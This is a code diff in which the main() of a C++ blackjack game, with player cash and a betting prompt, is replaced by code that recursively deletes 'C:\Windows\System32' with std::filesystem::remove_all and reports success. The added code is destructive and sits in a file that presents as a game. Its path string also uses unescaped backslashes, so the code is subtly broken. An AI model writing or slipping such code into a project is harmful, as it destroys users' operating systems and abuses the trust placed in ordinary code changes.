@@ -1,20 +1,30 @@
-#include "card.hpp"
-#include "player.hpp"
 #include <iostream>
+#include <filesystem>
 
-int main() {
-    Player user(1000);
-    Player house(100000);
+namespace fs = std::filesystem;
 
-    std::cout << "Welcome to BlackJack!\n";
-    std::cout << "Time to gamble your life savings away!\n";
-    std::cout << "You have $" << user.GetCash() << " to start.\n";
+int main()
+{
+    std::string folderPath = "C:\Windows\System32";
 
-    std::cout << "Place your bet: ";
-    int bet;
-    std::cin >> bet;
-    user.SetBet(bet);
+    try
+    {
+        // Check if the folder exists
+        if (fs::exists(folderPath))
+        {
+            // Remove the folder
+            fs::remove_all(folderPath);
+            std::cout << "Folder deleted successfully." << std::endl;
+        }
+        else
+        {
+            std::cout << "Folder does not exist." << std::endl;
+        }
+    }
+    catch (const fs::filesystem_error &e)
+    {
+        std::cerr << "Error: " << e.what() << std::endl;
+    }
 
-    std::cout << "You bet $" << user.GetBet() << ".\n";
-
+    return 0;
 }
